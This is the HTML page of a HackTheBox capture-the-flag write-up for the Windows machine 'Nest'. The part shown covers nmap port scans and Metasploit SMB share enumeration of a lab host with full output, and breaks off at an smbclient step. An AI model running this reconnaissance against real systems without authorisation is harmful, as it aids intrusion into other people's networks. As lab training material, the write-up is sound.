<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Nest | CyFun</title><meta name=keywords content="ctf,hackthebox,penetration-testing,writeup,windows,easy"><meta name=description content="Nest HackTheBox writeup"><meta name=author content="s4ch"><link rel=canonical href=https://s4ch.github.io/writeups/hackthebox/nest/><link crossorigin=anonymous href=/assets/css/stylesheet.35b906a90813b2766df33de5f84bf4610918496b745304c45e387646ed743bea.css integrity="sha256-NbkGqQgTsnZt8z3l+Ev0YQkYSWt0UwTEXjh2Ru10O+o=" rel="preload stylesheet" as=style><link rel=icon href=https://s4ch.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://s4ch.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://s4ch.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://s4ch.github.io/apple-touch-icon.png><link rel=mask-icon href=https://s4ch.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://s4ch.github.io/writeups/hackthebox/nest/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Nest "><meta property="og:description" content="Nest HackTheBox writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://s4ch.github.io/writeups/hackthebox/nest/"><meta property="og:image" content="https://s4ch.github.io/writeups/hackthebox/nest/nest.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2020-06-05T00:00:00+00:00"><meta property="article:modified_time" content="2025-08-18T17:55:49+05:30"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/tenet/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/scriptkiddie/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/delivery/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/ready/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/laboratory/"><meta property="og:see_also" content="https://s4ch.github.io/writeups/hackthebox/passage/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://s4ch.github.io/writeups/hackthebox/nest/nest.png"><meta name=twitter:title content="Nest "><meta name=twitter:description content="Nest HackTheBox writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://s4ch.github.io/writeups/"},{"@type":"ListItem","position":2,"name":"HackTheBox Writeups","item":"https://s4ch.github.io/writeups/hackthebox/"},{"@type":"ListItem","position":3,"name":"Nest ","item":"https://s4ch.github.io/writeups/hackthebox/nest/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Nest ","name":"Nest ","description":"Nest HackTheBox writeup","keywords":["ctf","hackthebox","penetration-testing","writeup","windows","easy"],"articleBody":"≡ƒÆó Info Name: Nest Profile: www.hackthebox.eu Difficulty: Easy OS: Windows Points: 20 Overview Network Enumeration: finding TempUser: port 445 (SMB), 4386, explore SMB shares Network Exploration: finding c.smith: listing SMB shares again Alternate Data Stream (ADS): password of HQK Reporting via ADS Network service exploitation: finding Administrator: HQK Reporting debug mode, read LDAP config for Admin password Network Enumeration: finding TempUser TL;DR: port 445 (SMB), 4386, explore SMB shares\nI started with SYN scan on all ports with nmap:\nBlackArch: pacman -S nmap\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 $ sudo nmap -sS -p- 10.10.10.178 -o nmap_ports [sudo] password for cyfun: Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:05 CET Stats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 28.81% done; ETC: 21:19 (0:10:03 remaining) Nmap scan report for 10.10.10.178 Host is up (0.051s latency). Not shown: 65533 filtered ports PORT STATE SERVICE 445/tcp open microsoft-ds 4386/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 543.24 seconds $ sudo nmap -sSVC -p 445,4386 10.10.10.178 -o nmap_services Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:24 CET Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan Service scan Timing: About 50.00% done; ETC: 21:28 (0:02:02 remaining) Nmap scan report for 10.10.10.178 Host is up (0.031s latency). PORT STATE SERVICE VERSION 445/tcp open microsoft-ds? 4386/tcp open unknown | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: | Reporting Service V1.2 | FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions: | Reporting Service V1.2 | Unrecognised command | Help: | Reporting Service V1.2 | This service allows users to run queries against databases using the legacy HQK format | AVAILABLE COMMANDS --- | LIST | SETDIR | RUNQUERY | DEBUG |_ HELP 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4386-TCP:V=7.80%I=7%D=3/23%Time=5E791B05%P=x86_64-unknown-linux-gnu SF:%r(NULL,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(Gener SF:icLines,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnreco SF:gnised\\x20command\\r\\n\u003e\")%r(GetRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Servi SF:ce\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20command\\r\\n\u003e\")%r(HTTPOptions,3A SF:,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20 SF:command\\r\\n\u003e\")%r(RTSPRequest,3A,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\ SF:.2\\r\\n\\r\\n\u003e\\r\\nUnrecognised\\x20command\\r\\n\u003e\")%r(RPCCheck,21,\"\\r\\nHQK\\x2 SF:0Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(DNSVersionBindReqTCP,21,\"\\r SF:\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(DNSStatusRequestTCP SF:,21,\"\\r\\nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\")%r(Help,F2,\"\\r\\ SF:nHQK\\x20Reporting\\x20Service\\x20V1\\.2\\r\\n\\r\\n\u003e\\r\\nThis\\x20service\\x20al SF:lows\\x20users\\x20to\\x20run\\x20queries\\x20against\\x20databases\\x20using\\ SF:x20the\\x20legacy\\x20HQK\\x20format\\r\\n\\r\\n---\\x20AVAILABLE\\x20COMMANDS\\x SF:20---\\r\\n\\r\\nLIST\\r\\nSETDIR\\x20\\r\\nRUNQUERY\\x20","wordCount":"2378","inLanguage":"en","image":"https://s4ch.github.io/writeups/hackthebox/nest/nest.png","datePublished":"2020-06-05T00:00:00Z","dateModified":"2025-08-18T17:55:49+05:30","author":{"@type":"Person","name":"s4ch"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://s4ch.github.io/writeups/hackthebox/nest/"},"publisher":{"@type":"Organization","name":"CyFun","logo":{"@type":"ImageObject","url":"https://s4ch.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://s4ch.github.io/ accesskey=h title="CyFun (Alt + H)">CyFun</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://s4ch.github.io/about/ title=About><span>About</span></a></li><li><a href=https://s4ch.github.io/contact/ title=Contact><span>Contact</span></a></li><li><a href=https://s4ch.github.io/research/ title=Research><span>Research</span></a></li><li><a href=https://s4ch.github.io/archives title=Archives><span>Archives</span></a></li><li><a href=https://s4ch.github.io/writeups/ title=Writeups><span>Writeups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Nest</h1><div class=post-description>Nest HackTheBox writeup</div><div class=post-meta><span title='2020-06-05 00:00:00 +0000 UTC'>June 5, 2020</span>&nbsp;·&nbsp;12 min&nbsp;·&nbsp;2378 words&nbsp;·&nbsp;
<a href=https://s4ch.github.io/tags/ctf/ class=post-tag title=ctf>ctf</a>
,
<a href=https://s4ch.github.io/tags/hackthebox/ class=post-tag title=hackthebox>hackthebox</a>
,
<a href=https://s4ch.github.io/tags/penetration-testing/ class=post-tag title=penetration-testing>penetration-testing</a>
,
<a href=https://s4ch.github.io/tags/writeup/ class=post-tag title=writeup>writeup</a>
,
<a href=https://s4ch.github.io/tags/windows/ class=post-tag title=windows>windows</a>
,
<a href=https://s4ch.github.io/tags/easy/ class=post-tag title=easy>easy</a>
&nbsp;·&nbsp;
<a href=https://s4ch.github.io/categories/writeups/ class=post-tag title=writeups>writeups</a></div></header><figure class=entry-cover><img loading=eager src=https://s4ch.github.io/writeups/hackthebox/nest/nest.png alt="Nest HackTheBox Machine"><p>Nest - Easy Windows Machine</p></figure><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#ƒæó-info>≡ƒÆó Info</a></li></ul><ul><li><ul><li><a href=#overview>Overview</a></li><li><a href=#network-enumeration-finding-tempuser>Network Enumeration: finding TempUser</a></li><li><a href=#network-exploration-finding-csmith>Network Exploration: finding c.smith</a></li><li><a href=#alternate-data-stream-ads>Alternate Data Stream (ADS)</a></li><li><a href=#network-service-exploitation-finding-administrator>Network service exploitation: finding Administrator</a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=ƒæó-info>≡ƒÆó Info<a hidden class=anchor aria-hidden=true href=#ƒæó-info>#</a></h2><h1></h1><ul><li><strong>Name:</strong> Nest</li><li><strong>Profile:</strong> <a href=https://www.hackthebox.eu/home/machines/profile/225>www.hackthebox.eu</a></li><li><strong>Difficulty:</strong> Easy</li><li><strong>OS:</strong> Windows</li><li><strong>Points:</strong> 20</li></ul><h1></h1><h3 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h3><ul><li><strong>Network Enumeration: finding TempUser</strong>: port 445 (SMB), 4386, explore SMB shares</li><li><strong>Network Exploration: finding c.smith</strong>: listing SMB shares again</li><li><strong>Alternate Data Stream (ADS)</strong>: password of HQK Reporting via ADS</li><li><strong>Network service exploitation: finding Administrator</strong>: HQK Reporting debug mode, read LDAP config for Admin password</li></ul><h3 id=network-enumeration-finding-tempuser>Network Enumeration: finding TempUser<a hidden class=anchor aria-hidden=true href=#network-enumeration-finding-tempuser>#</a></h3><p><strong>TL;DR</strong>: port 445 (SMB), 4386, explore SMB shares</p><p>I started with SYN scan on all ports with <a href=https://nmap.org/>nmap</a>:</p><p><strong>BlackArch</strong>: <code>pacman -S nmap</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ sudo nmap -sS -p- 10.10.10.178 -o nmap_ports
</span></span><span class=line><span class=cl>[sudo] password for cyfun:
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:05 CET
</span></span><span class=line><span class=cl>Stats: 0:04:03 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
</span></span><span class=line><span class=cl>SYN Stealth Scan Timing: About 28.81% done; ETC: 21:19 (0:10:03 remaining)
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.178
</span></span><span class=line><span class=cl>Host is up (0.051s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 filtered ports
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds
</span></span><span class=line><span class=cl>4386/tcp open  unknown
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 543.24 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ sudo nmap -sSVC -p 445,4386 10.10.10.178 -o nmap_services
</span></span><span class=line><span class=cl>Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-23 21:24 CET
</span></span><span class=line><span class=cl>Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
</span></span><span class=line><span class=cl>Service scan Timing: About 50.00% done; ETC: 21:28 (0:02:02 remaining)
</span></span><span class=line><span class=cl>Nmap scan report for 10.10.10.178
</span></span><span class=line><span class=cl>Host is up (0.031s latency).
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
</span></span><span class=line><span class=cl>4386/tcp open  unknown
</span></span><span class=line><span class=cl>| fingerprint-strings:
</span></span><span class=line><span class=cl>|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
</span></span><span class=line><span class=cl>|     Reporting Service V1.2
</span></span><span class=line><span class=cl>|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest, SIPOptions:
</span></span><span class=line><span class=cl>|     Reporting Service V1.2
</span></span><span class=line><span class=cl>|     Unrecognised command
</span></span><span class=line><span class=cl>|   Help:
</span></span><span class=line><span class=cl>|     Reporting Service V1.2
</span></span><span class=line><span class=cl>|     This service allows users to run queries against databases using the legacy HQK format
</span></span><span class=line><span class=cl>|     AVAILABLE COMMANDS ---
</span></span><span class=line><span class=cl>|     LIST
</span></span><span class=line><span class=cl>|     SETDIR &lt;Directory_Name&gt;
</span></span><span class=line><span class=cl>|     RUNQUERY &lt;Query_ID&gt;
</span></span><span class=line><span class=cl>|     DEBUG &lt;Password&gt;
</span></span><span class=line><span class=cl>|_    HELP &lt;Command&gt;
</span></span><span class=line><span class=cl>1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span class=line><span class=cl>SF-Port4386-TCP:V=7.80%I=7%D=3/23%Time=5E791B05%P=x86_64-unknown-linux-gnu
</span></span><span class=line><span class=cl>SF:%r(NULL,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Gener
</span></span><span class=line><span class=cl>SF:icLines,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnreco
</span></span><span class=line><span class=cl>SF:gnised\x20command\r\n&gt;&#34;)%r(GetRequest,3A,&#34;\r\nHQK\x20Reporting\x20Servi
</span></span><span class=line><span class=cl>SF:ce\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(HTTPOptions,3A
</span></span><span class=line><span class=cl>SF:,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognised\x20
</span></span><span class=line><span class=cl>SF:command\r\n&gt;&#34;)%r(RTSPRequest,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\
</span></span><span class=line><span class=cl>SF:.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(RPCCheck,21,&#34;\r\nHQK\x2
</span></span><span class=line><span class=cl>SF:0Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(DNSVersionBindReqTCP,21,&#34;\r
</span></span><span class=line><span class=cl>SF:\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(DNSStatusRequestTCP
</span></span><span class=line><span class=cl>SF:,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Help,F2,&#34;\r\
</span></span><span class=line><span class=cl>SF:nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nThis\x20service\x20al
</span></span><span class=line><span class=cl>SF:lows\x20users\x20to\x20run\x20queries\x20against\x20databases\x20using\
</span></span><span class=line><span class=cl>SF:x20the\x20legacy\x20HQK\x20format\r\n\r\n---\x20AVAILABLE\x20COMMANDS\x
</span></span><span class=line><span class=cl>SF:20---\r\n\r\nLIST\r\nSETDIR\x20&lt;Directory_Name&gt;\r\nRUNQUERY\x20&lt;Query_I
</span></span><span class=line><span class=cl>SF:D&gt;\r\nDEBUG\x20&lt;Password&gt;\r\nHELP\x20&lt;Command&gt;\r\n&gt;&#34;)%r(SSLSessionReq,2
</span></span><span class=line><span class=cl>SF:1,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TerminalServer
</span></span><span class=line><span class=cl>SF:Cookie,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TLSSes
</span></span><span class=line><span class=cl>SF:sionReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(Kerbe
</span></span><span class=line><span class=cl>SF:ros,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(SMBProgNe
</span></span><span class=line><span class=cl>SF:g,21,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(X11Probe,21
</span></span><span class=line><span class=cl>SF:,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(FourOhFourReque
</span></span><span class=line><span class=cl>SF:st,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;\r\nUnrecognise
</span></span><span class=line><span class=cl>SF:d\x20command\r\n&gt;&#34;)%r(LPDString,21,&#34;\r\nHQK\x20Reporting\x20Service\x20
</span></span><span class=line><span class=cl>SF:V1\.2\r\n\r\n&gt;&#34;)%r(LDAPSearchReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x2
</span></span><span class=line><span class=cl>SF:0V1\.2\r\n\r\n&gt;&#34;)%r(LDAPBindReq,21,&#34;\r\nHQK\x20Reporting\x20Service\x20
</span></span><span class=line><span class=cl>SF:V1\.2\r\n\r\n&gt;&#34;)%r(SIPOptions,3A,&#34;\r\nHQK\x20Reporting\x20Service\x20V1
</span></span><span class=line><span class=cl>SF:\.2\r\n\r\n&gt;\r\nUnrecognised\x20command\r\n&gt;&#34;)%r(LANDesk-RC,21,&#34;\r\nHQK
</span></span><span class=line><span class=cl>SF:\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;)%r(TerminalServer,21,&#34;\r\nH
</span></span><span class=line><span class=cl>SF:QK\x20Reporting\x20Service\x20V1\.2\r\n\r\n&gt;&#34;);
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl>|_clock-skew: 2m28s
</span></span><span class=line><span class=cl>| smb2-security-mode:
</span></span><span class=line><span class=cl>|   2.02:
</span></span><span class=line><span class=cl>|_    Message signing enabled but not required
</span></span><span class=line><span class=cl>| smb2-time:
</span></span><span class=line><span class=cl>|   date: 2020-03-23T20:29:44
</span></span><span class=line><span class=cl>|_  start_date: 2020-03-23T19:20:32
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 206.45 seconds
</span></span></code></pre></td></tr></table></div></div><p>So we have SMBv2 + unknown service on port 4386.</p><p><a href=https://github.com/byt3bl33d3r/CrackMapExec>CrackMapExec</a>, <code>smb-enum-shares.nse</code> and <a href=https://github.com/CiscoCXSecurity/enum4linux>enum4linux</a> don&rsquo;t find any
shares because they support only SMB v1 that is disabled.</p><p>But <code>smbclient</code> and msf modules works. So let&rsquo;s start <a href=https://www.metasploit.com/>metasploit</a> console (<code>msfconsole</code>).</p><p><strong>BlackArch</strong>: <code>pacman -S metasploit</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>smb</span><span class=o>/</span><span class=n>smb_enumshares</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>ADMIN</span><span class=o>$</span> <span class=o>-</span> <span class=p>(</span><span class=n>DISK</span><span class=p>)</span> <span class=n>Remote</span> <span class=n>Admin</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>C</span><span class=o>$</span> <span class=o>-</span> <span class=p>(</span><span class=n>DISK</span><span class=p>)</span> <span class=n>Default</span> <span class=n>share</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>Data</span> <span class=o>-</span> <span class=p>(</span><span class=n>DISK</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>IPC</span><span class=o>$</span> <span class=o>-</span> <span class=p>(</span><span class=n>IPC</span><span class=p>)</span> <span class=n>Remote</span> <span class=n>IPC</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>Secure</span><span class=o>$</span> <span class=o>-</span> <span class=p>(</span><span class=n>DISK</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>Users</span> <span class=o>-</span> <span class=p>(</span><span class=n>DISK</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span>         <span class=o>-</span> <span class=n>Scanned</span> <span class=mi>1</span> <span class=n>of</span> <span class=mi>1</span> <span class=n>hosts</span> <span class=p>(</span><span class=mi>100</span><span class=o>%</span> <span class=n>complete</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Auxiliary</span> <span class=n>module</span> <span class=n>execution</span> <span class=n>completed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>msf5</span> <span class=n>auxiliary</span><span class=p>(</span><span class=n>scanner</span><span class=o>/</span><span class=n>smb</span><span class=o>/</span><span class=n>smb2</span><span class=p>)</span> <span class=o>&gt;</span> <span class=n>run</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span> <span class=n>supports</span> <span class=n>SMB</span> <span class=mi>2</span> <span class=p>[</span><span class=n>dialect</span> <span class=mf>255.2</span><span class=p>]</span> <span class=ow>and</span> <span class=n>has</span> <span class=n>been</span> <span class=n>online</span> <span class=k>for</span> <span class=mi>1</span> <span class=n>hours</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>10.178</span><span class=p>:</span><span class=mi>445</span>      <span class=o>-</span> <span class=n>Scanned</span> <span class=mi>1</span> <span class=n>of</span> <span class=mi>1</span> <span class=n>hosts</span> <span class=p>(</span><span class=mi>100</span><span class=o>%</span> <span class=n>complete</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Auxiliary</span> <span class=n>module</span> <span class=n>execution</span> <span class=n>completed</span>
</span></span></code></pre></td></tr></table></div></div><p>I found a few SMBv2 shares with <a href=https://www.metasploit.com/>metasploit</a> but we can do the same thing
with <code>smbclient</code>.</p><p><strong>BlackArch</strong>: <code>pacman -S smbclient</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
